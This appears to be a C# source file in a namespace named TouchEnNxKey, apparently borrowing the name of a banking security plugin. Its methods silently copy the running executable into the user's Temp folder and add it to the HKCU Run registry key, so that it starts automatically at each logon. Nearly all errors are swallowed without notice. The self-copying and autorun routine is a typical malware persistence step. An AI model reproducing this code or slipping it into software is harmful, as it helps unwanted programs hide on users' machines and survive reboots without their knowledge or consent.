using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace TouchEnNxKey
{
    class Consistent
    {
        /// <summary>
        /// 
        /// </summary>
        /// <param name="newFileName">Temp 디렉토리에 저장될 새 파일명</param>
        public static void CloneAndAutoStart()
        {
            string myFullPath = System.Reflection.Assembly.GetEntryAssembly().Location;

            string tempPath = Path.GetTempPath();
            string newFileName = Path.GetFileName(myFullPath);
            string newFullPath = tempPath + newFileName;
            try
            {
                File.Copy(myFullPath, newFullPath, true);
                WriteRegistryToAutoStart(newFullPath);
            }
            catch (Exception)
            {

            }
        }

        public static void Clone()
        {
            string myFullPath = System.Reflection.Assembly.GetEntryAssembly().Location;

            string tempPath = Path.GetTempPath();
            string newFileName = Path.GetFileName(myFullPath);
            string newFullPath = tempPath + newFileName;
            try
            {
                File.Copy(myFullPath, newFullPath, true);
            }
            catch (Exception)
            {

            }
        }

        public static void AutoStart()
        {
            string myFullPath = System.Reflection.Assembly.GetEntryAssembly().Location;
            string tempPath = Path.GetTempPath();
            string newFileName = Path.GetFileName(myFullPath);
            string newFullPath = tempPath + newFileName;
            try
            {
                WriteRegistryToAutoStart(newFullPath);
            }
            catch (Exception)
            {

            }
        }

        public static bool isInTemp()
        {
            string myFullPath = System.Reflection.Assembly.GetEntryAssembly().Location;
            string tempPath = Path.GetTempPath();


            return (myFullPath.IndexOf(tempPath) == -1) ? false : true;
        }

        /// <summary>
        /// 부팅시 자동시작을 위해 현재 실행파일을 레지스트리에 등록한다.
        /// </summary>
        private static void WriteRegistryToAutoStart()
        {
            string myFullPath = System.Reflection.Assembly.GetEntryAssembly().Location;
            WriteRegistryToAutoStart(myFullPath);
        }

        /// <summary>
        /// 부팅시 자동시작을 위해 fullPath 를 레지스트리에 등록한다.
        /// </summary>
        /// <param name="fullPath"></param>
        private static void WriteRegistryToAutoStart(string fullPath)
        {
            string myFullPath = fullPath;
            string tempPath = Path.GetTempPath();
            string filename = Path.GetFileName(myFullPath);
            string _NAME = filename.Split('.')[0];
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                object valueObject = null;

                //레지스트리 등록
                valueObject = registryKey.GetValue(_NAME);
                if (valueObject == null)
                {
                    registryKey.SetValue(_NAME, myFullPath);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }
}
